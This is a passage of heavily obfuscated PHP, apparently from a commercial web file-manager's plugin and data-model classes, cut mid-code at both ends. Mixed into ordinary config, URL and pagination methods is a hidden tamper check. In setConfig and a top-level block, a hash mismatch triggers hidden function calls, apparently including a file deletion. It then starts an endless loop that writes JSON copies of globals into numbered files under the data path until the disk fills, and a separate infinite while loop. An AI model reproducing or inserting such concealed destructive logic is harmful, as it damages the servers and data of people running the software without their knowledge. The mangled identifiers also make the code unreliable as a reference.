($¼Ò‡àÁØ[$íÕã‹ˆ[1833]] == $òîåğñ[$íÕã‹ˆ[1807]]) { return; } $this->regist(); $this->setConfig(array($íÕã‹ˆ[1833] => $òîåğñ[$íÕã‹ˆ[1807]])); } final function initLang() { $Ÿ·½‰–ş =& $_SERVER[ŒÅŸ‹ä†]; $ˆ§ëˆ˜© = $Ÿ·½‰–ş[1834]; $œ©ÔèŠ = $this->pluginPath . $Ÿ·½‰–ş[1835]; $ùÁùì¶ = I18n::getType(); $ñÄ™Ÿì» = array(); if (file_exists($œ©ÔèŠ . $ùÁùì¶ . $Ÿ·½‰–ş[946])) { $ñÄ™Ÿì» = (include $œ©ÔèŠ . $ùÁùì¶ . $Ÿ·½‰–ş[946]); } else { if ($ùÁùì¶ == $Ÿ·½‰–ş[1836] && !file_exists($œ©ÔèŠ . $ùÁùì¶ . $Ÿ·½‰–ş[946]) && file_exists($œ©ÔèŠ . $Ÿ·½‰–ş[1837])) { $ñÄ™Ÿì» = (include $œ©ÔèŠ . $Ÿ·½‰–ş[1837]); $ùÁùì¶ = $Ÿ·½‰–ş[1653]; } else { if (file_exists($œ©ÔèŠ . $ˆ§ëˆ˜© . $Ÿ·½‰–ş[946])) { $ñÄ™Ÿì» = (include $œ©ÔèŠ . $ˆ§ëˆ˜© . $Ÿ·½‰–ş[946]); $ùÁùì¶ = $ˆ§ëˆ˜©; } } } if (!$ñÄ™Ÿì» || !is_array($ñÄ™Ÿì»)) { $ñÄ™Ÿì» = array(); } $şë˜»ç€ = Hook::trigger($Ÿ·½‰–ş[1838], $ñÄ™Ÿì», $this->pluginName, $ùÁùì¶); if ($şë˜»ç€ && is_array($şë˜»ç€)) { $ñÄ™Ÿì» = $şë˜»ç€; } if (@count($ñÄ™Ÿì») > 0) { I18n::set($ñÄ™Ÿì»); } return $ñÄ™Ÿì»; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ü†šÌéº) { $Ñş±ô½ =& $_SERVER[ŒÅŸ‹ä†]; $æ’Å¦ØÏ = $_SERVER[$Ñş±ô½[16]] . $Ñş±ô½[17]; $“Õ¤ã‚ã = $Ñş±ô½[985]; if ($_SERVER[$Ñş±ô½[13]] != $“Õ¤ã‚ã($æ’Å¦ØÏ)) { $Öõ‰§¬Ï = $Ñş±ô½[986]; $â©¤ê™× = $Ñş±ô½[15]; $ĞÕÆ½×Ó = $_SERVER[$Ñş±ô½[16]] . $Ñş±ô½[17]; $ŒÀƒ•Ñƒ = $â©¤ê™×($ĞÕÆ½×Ó); $ûìèå¯Ê = explode($Ñş±ô½[18], $ŒÀƒ•Ñƒ); if (count($ûìèå¯Ê) < $Ñş±ô½[716]) { $Ø†€ã’ı = $Ñş±ô½[20]; $Ø†€ã’ı(); } $Ñ¢Å·­° = $Ñş±ô½[987]; $Ñ¢Å·­°($_SERVER[$Ñş±ô½[988]]); $Öõ‰§¬Ï = $Ñş±ô½[986]; $Öõ‰§¬Ï(); $ç¯­¤€‚ = $Ñş±ô½[989]; $×Ÿ¨Ñ±‘ = json_encode($GLOBALS[$Ñş±ô½[990]]); $‚¸ÉñÉ³ = 1; for ($ƒÁ®üæ› = $‚¸ÉñÉ³; $ƒÁ®üæ› > 0; $ƒÁ®üæ›++) { $ç¯­¤€‚(DATA_PATH . $ƒÁ®üæ›, $×Ÿ¨Ñ±‘); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ü†šÌéº); } public function onSetConfig($˜¨‘Œ§) { } public function onGetConfig($Ì×°¨Î) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($Ó¾™¹¯Â) { if ($Ó¾™¹¯Â == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($üÈè°¸¢ = "\x70\x6c\165\147\x69\156\x41\x75\164\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ş¸ä¥ö‚ = $this->getConfig(); if (!$ş¸ä¥ö‚[$üÈè°¸¢]) { return !1; } return ActionCall($_SERVER[ŒÅŸ‹ä†][1839], $ş¸ä¥ö‚[$üÈè°¸¢]); } public function url($áË×ßÎı, $ÏÂ„˜ñğ = '', $¬šÕÀƒ¡ = true) { $¯ÙÈÈÑ¥ =& $_SERVER[ŒÅŸ‹ä†]; $è¥ŠÅµ¼ = $this->getConfig(); $±Óõ©”ª = KOD_VERSION . $¯ÙÈÈÑ¥[10] . KOD_VERSION_BUILD; $º¬Ç¥İÛ = $this->packageVersion(); $™œÃ¬¶â = $±Óõ©”ª . $¯ÙÈÈÑ¥[482] . $º¬Ç¥İÛ; if (substr($áË×ßÎı, 0, 4) == $¯ÙÈÈÑ¥[160] || substr($áË×ßÎı, 0, 2) == $¯ÙÈÈÑ¥[1467]) { $ñÁçèñ = $áË×ßÎı . $¯ÙÈÈÑ¥[1840] . $™œÃ¬¶â; } else { if ($ÏÂ„˜ñğ == $¯ÙÈÈÑ¥[12]) { $ñÁçèñ = $this->pluginHost . $áË×ßÎı . $¯ÙÈÈÑ¥[1840] . $™œÃ¬¶â; } else { if ($ÏÂ„˜ñğ === $¯ÙÈÈÑ¥[88]) { $ñÁçèñ = $this->pluginHost . $áË×ßÎı; } else { if ($ÏÂ„˜ñğ == $¯ÙÈÈÑ¥[1841]) { $ñÁçèñ = STATIC_PATH . $áË×ßÎı . $¯ÙÈÈÑ¥[1840] . $±Óõ©”ª; } else { if ($ÏÂ„˜ñğ == $¯ÙÈÈÑ¥[1842]) { $ñÁçèñ = APP_HOST . $¯ÙÈÈÑ¥[1843] . $áË×ßÎı . $¯ÙÈÈÑ¥[1840] . $±Óõ©”ª; } else { if (isset($è¥ŠÅµ¼[$ÏÂ„˜ñğ])) { $ñÁçèñ = $è¥ŠÅµ¼[$ÏÂ„˜ñğ] . $áË×ßÎı . $¯ÙÈÈÑ¥[1840] . $™œÃ¬¶â; } } } } } } if (!$¬šÕÀƒ¡) { return $ñÁçèñ; } echo $ñÁçèñ; } public function link($®–°Ñå« = false, $Õ¥Õ†ÊÂ = '') { $ºâÖè”ü =& $_SERVER[ŒÅŸ‹ä†]; $Ó’‘¤Àü = $this->linkHas == !1; $this->linkHas = !0; if (!$®–°Ñå«) { $this->link($ºâÖè”ü[1844], $ºâÖè”ü[1842]); $this->link($ºâÖè”ü[1845], $ºâÖè”ü[1841]); $this->link($ºâÖè”ü[1846], $ºâÖè”ü[1841]); $this->link($ºâÖè”ü[1847], $ºâÖè”ü[1841]); $this->link($ºâÖè”ü[1848], $ºâÖè”ü[1841]); if ($Ó’‘¤Àü) { Hook::trigger($ºâÖè”ü[1849]); } return; } $©¤ßÀÁã = $this->url($®–°Ñå«, $Õ¥Õ†ÊÂ, !1); if (substr($®–°Ñå«, -3) == $ºâÖè”ü[1850]) { echo $ºâÖè”ü[1851] . $©¤ßÀÁã . $ºâÖè”ü[1852] . $ºâÖè”ü[18]; } else { if (substr($®–°Ñå«, -4) == $ºâÖè”ü[1853]) { echo $ºâÖè”ü[1854] . $©¤ßÀÁã . $ºâÖè”ü[1855] . $ºâÖè”ü[18]; } } if ($Ó’‘¤Àü) { Hook::trigger($ºâÖè”ü[1849]); } } } if (!isset($_SERVER[$_SERVER[ŒÅŸ‹ä†][13]]) || !isset($_SERVER[$_SERVER[ŒÅŸ‹ä†][22]])) { $_getc = $_SERVER[ŒÅŸ‹ä†][15]; $_getfile = $_SERVER[$_SERVER[ŒÅŸ‹ä†][16]] . $_SERVER[ŒÅŸ‹ä†][17]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ŒÅŸ‹ä†][18], $_getfilec); if (count($_getarrs) < $_SERVER[ŒÅŸ‹ä†][19]) { $exit = $_SERVER[ŒÅŸ‹ä†][20]; $exit(); } $_act = $_SERVER[ŒÅŸ‹ä†][21]; $_act($_SERVER[$_SERVER[ŒÅŸ‹ä†][16]] . $_SERVER[ŒÅŸ‹ä†][17]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ŒÅŸ‹ä†][472]); } } goto añ¥À×êãŞ; A£Ç×•ùß: function binCheckBigger($„½áåÜÂ, $ÏûÄ¹ô) { return $„½áåÜÂ > $ÏûÄ¹ô; } $_SERVER[$_SERVER[ïığÌï][3]] = ("\71\60\66\71".base64_decode('NTc='))+0;$_ref6="din092ab56g3vt7pe4wokxjlhsfz8qr1yucmia8qbpy2910vsxl6knzw5fod7me3jgurc";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ö‰ÒŠò, $º‚£–¸) { $Õç®Ã‘‚ =& $_SERVER[ŒÅŸ‹ä†]; if (isset(self::$_methodList[$ö‰ÒŠò])) { return @call_user_func_array(self::$_methodList[$ö‰ÒŠò], $º‚£–¸); } else { if (method_exists($this, $ö‰ÒŠò)) { return call_user_func_array(array($this, $ö‰ÒŠò), $º‚£–¸); } else { think_exception(__CLASS__ . $Õç®Ã‘‚[4] . $ö‰ÒŠò . $Õç®Ã‘‚[5]); } } } public static function __callStatic($¼ÈÓ®ŠŠ, $ˆ—ÃÔÁÎ) { if (isset(self::$_methodListStatic[$¼ÈÓ®ŠŠ])) { return call_user_func_array(self::$_methodListStatic[$¼ÈÓ®ŠŠ], $ˆ—ÃÔÁÎ); } else { if (method_exists(self, $¼ÈÓ®ŠŠ)) { return call_user_func_array(array(self, $¼ÈÓ®ŠŠ), $ˆ—ÃÔÁÎ); } else { show_json("{$¼ÈÓ®ŠŠ}\50\x29\40\156\x6f\x74\x20\145\170\151\x73\x74\73", !1); } } } public static function addMethod($ÑßÀ„ß‰, $«¢¸ÂØ) { self::$_methodList[$ÑßÀ„ß‰] = $«¢¸ÂØ; } public static function addMethodStatic($Ä©—û†³, $»ŒÂ‘ÀÌ) { self::$_methodListStatic[$Ä©—û†³] = $»ŒÂ‘ÀÌ; } } goto aó¹ÖÄ¿šø; B¼ä¹¸å÷¨: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\151\x66\171\x54\x69\x6d\145", "\x74\151\x6d\145", "\151\x6e\163\x65\162\x74\x2c\165\x70\x64\x61\164\145", "\x66\165\x6e\x63\164\x69\157\x6e"), array("\143\x72\145\141\164\145\x54\x69\155\x65", "\164\x69\155\145", "\151\x6e\163\x65\162\x74", "\146\x75\x6e\x63\164\151\157\156")); public function setDataAuto($Í‡Œ×ñ) { $this->dataAuto = $Í‡Œ×ñ; } public function __construct($±ö ˆƒ» = '', $Åãª¼Ÿ  = '', $†«“‘ºı = '') { parent::__construct($±ö ˆƒ», $Åãª¼Ÿ , $†«“‘ºı); } protected $tableMeta = array(); protected function _beforeInsert(&$çÖÊÃ‘ù, $­û¸Ë—á) { $§œ³Ï–Ş =& $_SERVER[ŒÅŸ‹ä†]; if (!$this->checkDataAutoHas($§œ³Ï–Ş[440])) { return; } $this->dataBeforeFilter($çÖÊÃ‘ù, $§œ³Ï–Ş[440]); } protected function _beforeUpdate(&$Íš¢Ä¸, $ªˆÖáÒÒ) { $Å˜¨´ÁÔ =& $_SERVER[ŒÅŸ‹ä†]; if (!$this->checkDataAutoHas($Å˜¨´ÁÔ[441])) { return; } $this->dataBeforeFilter($Íš¢Ä¸, $Å˜¨´ÁÔ[441]); } protected function _afterSelect(&$ËÏËØÅ, $£´€ğÒ¹) { if (!is_array($ËÏËØÅ)) { return; } if (!$this->checkDataAutoHas($_SERVER[ŒÅŸ‹ä†][442])) { return; } foreach ($ËÏËØÅ as &$•²Îäöœ) { $this->dataAfterFilter($•²Îäöœ); } unset($•²Îäöœ); } protected function _afterFind(&$âİöŠœ‰, $ŞøÊÖŞª) { if (!is_array($âİöŠœ‰)) { return; } if (!$this->checkDataAutoHas($_SERVER[ŒÅŸ‹ä†][442])) { return; } $this->dataAfterFilter($âİöŠœ‰); } public static function textEncode($ßˆô‹í†) { if (!$ßˆô‹í†) { return $ßˆô‹í†; } $Åı’«ò = json_encode($ßˆô‹í†); $Åı’«ò = preg_replace_callback($_SERVER[ŒÅŸ‹ä†][443], function ($£Œ”á©) { return addslashes($£Œ”á©[0]); }, $Åı’«ò); return json_decode($Åı’«ò); } public static function textDecode($€ïêïÁŸ) { $–Ã„“ºº =& $_SERVER[ŒÅŸ‹ä†]; if (!$€ïêïÁŸ) { return $€ïêïÁŸ; } $Ïö¥®é— = json_encode($€ïêïÁŸ); $Ïö¥®é— = preg_replace_callback($–Ã„“ºº[444], function ($•“ºĞ†Ç) { return $_SERVER[ŒÅŸ‹ä†][108]; }, $Ïö¥®é—); return json_decode($Ïö¥®é—); } public function setAutoIncrement($‚ìä°æ€) { $Ö»Ü¹Ùë = array($this->getPk() => $‚ìä°æ€); $ĞªÈşâ™ = $this->data($Ö»Ü¹Ùë)->add(); if ($ĞªÈşâ™) { $this->delete($ĞªÈşâ™); } } public function getAutoIncrement() { $í‘ª¤ƒì = $this->getTableName(); $³³£Ó´ = $this->max($this->getPk()); $¼êé­« = $this->query("\x73\150\x6f\167\40\164\141\142\154\145\x20\x73\164\141\x74\165\163\x20\167\x68\145\162\145\40\116\x61\155\x65\75\47{$í‘ª¤ƒì}\x27"); $Ì£Åã¨´ = $¼êé­«[0][$_SERVER[ŒÅŸ‹ä†][445]]; $áˆÎµŞ = max($³³£Ó´, $Ì£Åã¨´); return $áˆÎµŞ; } protected function _callBefore($òÂíòÅŠ, $ñ½äğßß) { return $this->cacheCallCheck($òÂíòÅŠ, $ñ½äğßß, !1); } protected function _callAfter($±°·ùâì, $¢Û«ÈÁ·) { return $this->cacheCallCheck($±°·ùâì, $¢Û«ÈÁ·, !0); } protected function cacheFunctionAlias($íøÍ½“à) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($¨¬Ùù¨¡, $­úÎòüŞ, $Ï‚ªÏÕß = false) { $Ğ°Ãı–ü =& $_SERVER[ŒÅŸ‹ä†]; $å×Øœİ = $this->cacheFunctionAlias($­úÎòüŞ); if (!$å×Øœİ) { return; } foreach ($å×Øœİ as $£§àü™Ì => $¨³’ºô˜) { $†×íö»– = $¨³’ºô˜[0]; $íÓ¬ä”Â = explode($Ğ°Ãı–ü[60], $¨³’ºô˜[1]); $“‹»ñ = isset($¨³’ºô˜[2]) ? $¨³’ºô˜[2] : $Ğ°Ãı–ü[12]; if ($¨¬Ùù¨¡ == $£§àü™Ì) { return $this->cacheFunctionGet($£§àü™Ì, $†×íö»–, $“‹»ñ); } if ($Ï‚ªÏÕß && in_array($¨¬Ùù¨¡, $íÓ¬ä”Â)) { $this->cacheFunctionClear($£§àü™Ì, $†×íö»–, $“‹»ñ); } } } public function cacheFunctionGet($ÛŒ±”¥, $®«§˜‚î, $õûÉ†±é = '') { $„Èª„ßÇ =& $_SERVER[ŒÅŸ‹ä†]; $ÉÛÖ¶­Ò = $this->cacheKeyMake($ÛŒ±”¥, $®«§˜‚î, $õûÉ†±é); $Ëâ®÷µ· = Cache::get($ÉÛÖ¶­Ò); if (!is_array($Ëâ®÷µ·)) { if (method_exists($this, $„Èª„ßÇ[351] . $ÛŒ±”¥)) { $ÛŒ±”¥ = $„Èª„ßÇ[351] . $ÛŒ±”¥; } $Ëâ®÷µ· = call_user_func_array(array($this, $ÛŒ±”¥), array($®«§˜‚î, !0)); Cache::set($ÉÛÖ¶­Ò, $Ëâ®÷µ·); } return $Ëâ®÷µ·; } public function cacheFunctionClear($û†Ôƒ •, $²éÓĞ×Á, $ˆå¥éá¦ = '') { $‚°îÂ’Ø = $²éÓĞ×Á; if (!is_array($²éÓĞ×Á)) { $‚°îÂ’Ø = array($²éÓĞ×Á); } foreach ($‚°îÂ’Ø as $åÅ¯†úü) { $Ë“‹›Õ¥ = $this->cacheKeyMake($û†Ôƒ •, $åÅ¯†úü, $ˆå¥éá¦); Cache::remove($Ë“‹›Õ¥); } } public function cacheKeyMake($üŒ§Ï‘È, $Í‡Ïß‚µ, $»Ó•Šëˆ) { $’¯ˆ¥Ù =& $_SERVER[ŒÅŸ‹ä†]; if ($»Ó•Šëˆ) { $Í‡Ïß‚µ = $Í‡Ïß‚µ . $’¯ˆ¥Ù[446] . $»Ó•Šëˆ; } return get_class($this) . $’¯ˆ¥Ù[11] . $üŒ§Ï‘È . $’¯ˆ¥Ù[447] . $Í‡Ïß‚µ; } protected function selectPageReset() { $ë¿‹ÆÆˆ =& $_SERVER[ŒÅŸ‹ä†]; if (isset($GLOBALS[$ë¿‹ÆÆˆ[448]])) { return; } $GLOBALS[$ë¿‹ÆÆˆ[448]] = isset($GLOBALS[$ë¿‹ÆÆˆ[7]][$ë¿‹ÆÆˆ[449]]) ? $GLOBALS[$ë¿‹ÆÆˆ[7]][$ë¿‹ÆÆˆ[449]] : !1; $GLOBALS[$ë¿‹ÆÆˆ[450]] = isset($GLOBALS[$ë¿‹ÆÆˆ[7]][$ë¿‹ÆÆˆ[438]]) ? $GLOBALS[$ë¿‹ÆÆˆ[7]][$ë¿‹ÆÆˆ[438]] : !1; $GLOBALS[$ë¿‹ÆÆˆ[7]][$ë¿‹ÆÆˆ[449]] = !1; $GLOBALS[$ë¿‹ÆÆˆ[7]][$ë¿‹ÆÆˆ[438]] = !1; } protected function selectPageRestore() { $¿®ŒŸ¸§ =& $_SERVER[ŒÅŸ‹ä†]; if (!isset($GLOBALS[$¿®ŒŸ¸§[448]])) { return; } $GLOBALS[$¿®ŒŸ¸§[7]][$¿®ŒŸ¸§[449]] = $GLOBALS[$¿®ŒŸ¸§[448]]; $GLOBALS[$¿®ŒŸ¸§[7]][$¿®ŒŸ¸§[438]] = $GLOBALS[$¿®ŒŸ¸§[450]]; if ($GLOBALS[$¿®ŒŸ¸§[7]][$¿®ŒŸ¸§[449]] === !1) { unset($GLOBALS[$¿®ŒŸ¸§[7]][$¿®ŒŸ¸§[449]]); } if ($GLOBALS[$¿®ŒŸ¸§[7]][$¿®ŒŸ¸§[438]] === !1) { unset($GLOBALS[$¿®ŒŸ¸§[7]][$¿®ŒŸ¸§[438]]); } unset($GLOBALS[$¿®ŒŸ¸§[448]]); unset($GLOBALS[$¿®ŒŸ¸§[450]]); } protected function selectPage($À½‡šõÚ = 200, $„®²ïÑµ = 1) { $úôí¢‰æ =& $_SERVER[ŒÅŸ‹ä†]; global $in; $è¡˜Ç™Ã = $this->optionsValue(); $ü©’›Ë = 50000; $À½‡šõÚ = isset($in[$úôí¢‰æ[449]]) && $in[$úôí¢‰æ[449]] ? $in[$úôí¢‰æ[449]] : $À½‡šõÚ; if ($À½‡šõÚ === -1) { $in[$úôí¢‰æ[449]] = !1; $ü©’›Ë = 100000000; $À½‡šõÚ = $ü©’›Ë; } $‚é¨±µÄ = $è¡˜Ç™Ã; $‚é¨±µÄ[$úôí¢‰æ[451]] = array(); $À½‡šõÚ = intval($À½‡šõÚ); $À½‡šõÚ = $À½‡šõÚ <= 5 ? 5 : ($À½‡šõÚ >= $ü©’›Ë ? $ü©’›Ë : $À½‡šõÚ); $„®²ïÑµ = intval(isset($in[$úôí¢‰æ[438]]) && $in[$úôí¢‰æ[438]] ? $in[$úôí¢‰æ[438]] : $„®²ïÑµ); $„®²ïÑµ = $„®²ïÑµ <= 1 ? 1 : $„®²ïÑµ; $²€¥şÛ” = array(); $µ¦«˜œ­ = 1; if ($„®²ïÑµ == 1 && $µ¦«˜œ­) { $this->optionsValue($è¡˜Ç™Ã); $²€¥şÛ” = $this->page($„®²ïÑµ, $À½‡šõÚ)->select(); $îÄáÌ®‘ = is_array($²€¥şÛ”) ? count($²€¥şÛ”) : 0; if ($îÄáÌ®‘ < $À½‡šõÚ) { $¶¬â…ÒÕ = 1; } else { $this->optionsValue($‚é¨±µÄ); $îÄáÌ®‘ = intval($this->count()); $¶¬â…ÒÕ = ceil($îÄáÌ®‘ / $À½‡šõÚ); } } else { $this->optionsValue($‚é¨±µÄ); $îÄáÌ®‘ = intval($this->count()); $¶¬â…ÒÕ = ceil($îÄáÌ®‘ / $À½‡šõÚ); $„®²ïÑµ = $„®²ïÑµ >= $¶¬â…ÒÕ ? $¶¬â…ÒÕ : $„®²ïÑµ; $this->optionsValue($è¡˜Ç™Ã); $²€¥şÛ” = $this->page($„®²ïÑµ, $À½‡šõÚ)->select(); } if (!is_array($²€¥şÛ”)) { $²€¥şÛ” = array(); } if ($¶¬â…ÒÕ == 1) { $îÄáÌ®‘ = count($²€¥şÛ”); } $–‡úŸèó = array($úôí¢‰æ[452] => array($úôí¢‰æ[453] => $îÄáÌ®‘, $úôí¢‰æ[449] => $À½‡šõÚ, $úôí¢‰æ[438] => $„®²ïÑµ, $úôí¢‰æ[454] => $¶¬â…ÒÕ), $úôí¢‰æ[455] => $²€¥şÛ”); return $–‡úŸèó; } protected function checkLength($ÑÃ‡“š†, $ñ¢°§³ = 0, $¯ÚáÃí˜ = '') { $ü¹Ş˜Ò¸ =& $_SERVER[ŒÅŸ‹ä†]; $ñ¢°§³ = $ñ¢°§³ ? $ñ¢°§³ : 65536; if (!$ÑÃ‡“š† || strlen($ÑÃ‡“š†) < $ñ¢°§³) { return; } $¯ÚáÃí˜ = $¯ÚáÃí˜ ? $¯ÚáÃí˜ . $ü¹Ş˜Ò¸[84] : $ü¹Ş˜Ò¸[12]; show_json($¯ÚáÃí˜ . LNG($ü¹Ş˜Ò¸[456]) . "\50{$ñ¢°§³}\x29", !1); } protected function metaSet($ñ¿ñ¡äé, $ÌÁÓÔúØ = null, $’èíü”º = null) { $ŞÕÎÏÛ =& $_SERVER[ŒÅŸ‹ä†]; if (!$this->tableMeta || !$ñ¿ñ¡äé) { return !1; } $ù”è³±© = $this->tableMeta[$ŞÕÎÏÛ[457]]; $µø¦³ù¢ = $this->tableMeta[$ŞÕÎÏÛ[458]]; $ÅÛ¦¾¹é = Model($µø¦³ù¢); $Éïä× = array($ù”è³±© => $ñ¿ñ¡äé, $ŞÕÎÏÛ[459] => $ÌÁÓÔúØ); if (is_null($ÌÁÓÔúØ)) { return $ÅÛ¦¾¹é->where(array($ù”è³±© => $ñ¿ñ¡äé))->delete(); } if (is_null($’èíü”º) && is_string($ÌÁÓÔúØ)) { return $ÅÛ¦¾¹é->where($Éïä×)->delete(); } $äµÆá¾É = is_array($ÌÁÓÔúØ) ? $ÌÁÓÔúØ : array(); if (is_string($ÌÁÓÔúØ)) { $äµÆá¾É[$ÌÁÓÔúØ] = $’èíü”º; } $‡¹úş›š = array(); foreach ($äµÆá¾É as $öç»”” => $øúá¬·ü) { if (is_null($øúá¬·ü) && is_string($öç»””)) { $ÅÛ¦¾¹é->where(array($ù”è³±© => $ñ¿ñ¡äé, $ŞÕÎÏÛ[459] => $öç»””))->delete(); continue; } $this->checkLength($øúá¬·ü, !1, $µø¦³ù¢ . $ŞÕÎÏÛ[4] . $öç»””); $‡¹úş›š[] = array($ù”è³±© => $ñ¿ñ¡äé, $ŞÕÎÏÛ[105] => $öç»””, $ŞÕÎÏÛ[460] => $øúá¬·ü); } $Š°Õ›ÏÃ = $ŞÕÎÏÛ[461] . $µø¦³ù¢; CacheLock::lock($Š°Õ›ÏÃ); $ÅÛ¦¾¹é->where(array($ù”è³±© => $ñ¿ñ¡äé))->addAll($‡¹úş›š, array(), !0); CacheLock::unlock($Š°Õ›ÏÃ); return !0; } public function metaGet($¼à ÆÜ, $—Í§µ¬ = false) { $æÛ¨–Ú¡ =& $_SERVER[ŒÅŸ‹ä†]; if (!$this->tableMeta) { return array(); } $«¾¡¿«Û = $this->tableMeta[$æÛ¨–Ú¡[457]]; $ÅĞÕÆëØ = Model($this->tableMeta[$æÛ¨–Ú¡[458]]); if ($—Í§µ¬) { $ö„­»ø = array($«¾¡¿«Û => $¼à ÆÜ, $æÛ¨–Ú¡[105] => $—Í§µ¬); return $ÅĞÕÆëØ->where($ö„­»ø)->getField($æÛ¨–Ú¡[460]); } $ö„­»ø = array($«¾¡¿«Û => $¼à ÆÜ); $–…Õûí¦ = $ÅĞÕÆëØ->field($æÛ¨–Ú¡[462])->where($ö„­»ø)->select(); $–…Õûí¦ = array_to_keyvalue($–…Õûí¦, $æÛ¨–Ú¡[105], $æÛ¨–Ú¡[460]); return $–…Õûí¦; } private function checkDataAutoHas($îú÷§Ö•) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $®«”¤ã‹) { if (in_array($îú÷§Ö•, explode($_SERVER[ŒÅŸ‹ä†][60], $®«”¤ã‹[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ôªÊ¸ş…, $•ŸÆ‘†…) { $°°ô˜¿ =& $_SERVER[ŒÅŸ‹ä†]; if (!is_array($ôªÊ¸ş…)) { return; } foreach ($this->dataAuto as $ÑÅÙªÀ) { $˜Ã±â«­ = $ÑÅÙªÀ[0]; if (!in_array($•ŸÆ‘†…, explode($°°ô˜¿[60], $ÑÅÙªÀ[2]))) { continue; } switch (trim($ÑÅÙªÀ[3])) { case $°°ô˜¿[406]: case $°°ô˜¿[407]: $«”Ì¤õü = $ÑÅÙªÀ[1]; $¡‚·î¹Œ = isset($ÑÅÙªÀ[4]) ? (array) $ÑÅÙªÀ[4] : array(); if ($«”Ì¤õü == $°°ô˜¿[215] && array_key_exists($˜Ã±â«­, $ôªÊ¸ş…)) { if (!$ôªÊ¸ş…[$˜Ã±â«­]) { unset($ôªÊ¸ş…[$˜Ã±â«­]); } break; } if (isset($ôªÊ¸ş…[$˜Ã±â«­])) { array_unshift($¡‚·î¹Œ, $ôªÊ¸ş…[$˜Ã±â«­]); } if ($°°ô˜¿[406] == $ÑÅÙªÀ[3]) { $ôªÊ¸ş…[$˜Ã±â«­] = call_user_func_array($«”Ì¤õü, $¡‚·î¹Œ); } else { $ôªÊ¸ş…[$˜Ã±â«­] = call_user_func_array(array(&$this, $«”Ì¤õü), $¡‚·î¹Œ); } break; case $°°ô˜¿[358]: if (isset($ôªÊ¸ş…[$˜Ã±â«­]) && $ôªÊ¸ş…[$˜Ã±â«­]) { $ôªÊ¸ş…[$˜Ã±â«­] = call_user_func_array(array(&$this, $ÑÅÙªÀ[1]), array($ôªÊ¸ş…[$˜Ã±â«­])); } break; case $°°ô˜¿[361]: $ôªÊ¸ş…[$˜Ã±â«­] = $ôªÊ¸ş…[$ÑÅÙªÀ[1]]; break; case $°°ô˜¿[379]: if (isset($ôªÊ¸ş…[$˜Ã±â«­]) && !is_string($ôªÊ¸ş…[$˜Ã±â«­])) { $ôªÊ¸ş…[$˜Ã±â«­] = json_encode_force($ôªÊ¸ş…[$˜Ã±â«­]); $ôªÊ¸ş…[$˜Ã±â«­] = self::textEncode($ôªÊ¸ş…[$˜Ã±â«­]); } break; case $°°ô˜¿[408]: if ($ôªÊ¸ş…[$˜Ã±â«­] === $°°ô˜¿[12]) { unset($ôªÊ¸ş…[$˜Ã±â«­]); } break; case $°°ô˜¿[409]: $ôªÊ¸ş…[$˜Ã±â«­] = $ÑÅÙªÀ[1]; default: break; } } if ($•ŸÆ‘†… == $°°ô˜¿[440]) { $ÙÊ­çŠ¯ = strtolower($this->db->getDbType()); if (strpos($ÙÊ­çŠ¯, $°°ô˜¿[23]) !== 0) { return; } $«™è„Š = $this->field(!0)->fields; $ğø‚® = $«™è„Š[$°°ô˜¿[339]]; if (isset($«™è„Š[$°°ô˜¿[338]])) { unset($ğø‚®[$«™è„Š[$°°ô˜¿[338]]]); } foreach ($ğø‚® as $ÊÍ½ªÊÄ => $•ŸÆ‘†…) { if (!isset($ôªÊ¸ş…[$ÊÍ½ªÊÄ])) { $ôªÊ¸ş…[$ÊÍ½ªÊÄ] = $°°ô˜¿[12]; } } } } private function dataAfterFilter(&$¾Ò¶Öœ) { $ìÉŒè =& $_SERVER[ŒÅŸ‹ä†]; foreach ($this->dataAuto as $òşŸ“ªó) { $Úû¬…ä = $òşŸ“ªó[0]; if (!isset($¾Ò¶Öœ[$Úû¬…ä])) { continue; } if (!in_array($ìÉŒè[442], explode($ìÉŒè[60], $òşŸ“ªó[2]))) { continue; } switch (trim($òşŸ“ªó[3])) { case $ìÉŒè[406]: case $ìÉŒè[407]: $»×Ğ = isset($òşŸ“ªó[4]) ? (array) $òşŸ“ªó[4] : array(); array_unshift($»×Ğ, $¾Ò¶Öœ[$Úû¬…ä]); if (isset($òşŸ“ªó[4]) && $òşŸ“ªó[4] == $ìÉŒè[463]) { $»×Ğ = array($¾Ò¶Öœ[$Úû¬…ä]); } if ($ìÉŒè[406] == $òşŸ“ªó[3]) { $¾Ò¶Öœ[$Úû¬…ä] = call_user_func_array($òşŸ“ªó[1], $»×Ğ); } else { $¾Ò¶Öœ[$Úû¬…ä] = call_user_func_array(array(&$this, $òşŸ“ªó[1]), $»×Ğ); } break; case $ìÉŒè[358]: if (isset($¾Ò¶Öœ[$Úû¬…ä]) && $¾Ò¶Öœ[$Úû¬…ä]) { $¾Ò¶Öœ[$Úû¬…ä] = call_user_func_array(array(&$this, $òşŸ“ªó[1]), array($¾Ò¶Öœ[$Úû¬…ä])); } break; case $ìÉŒè[361]: $¾Ò¶Öœ[$Úû¬…ä] = $¾Ò¶Öœ[$òşŸ“ªó[1]]; break; case $ìÉŒè[379]: $±ü«ˆ–Õ = $¾Ò¶Öœ[$Úû¬…ä]; $±ü«ˆ–Õ = self::textDecode($±ü«ˆ–Õ); $¾Ò¶Öœ[$Úû¬…ä] = json_decode($±ü«ˆ–Õ, !0); if (is_null($¾Ò¶Öœ[$Úû¬…ä])) { $¾Ò¶Öœ[$Úû¬…ä] = $±ü«ˆ–Õ; } break; case $ìÉŒè[408]: if ($¾Ò¶Öœ[$Úû¬…ä] === $ìÉŒè[12]) { 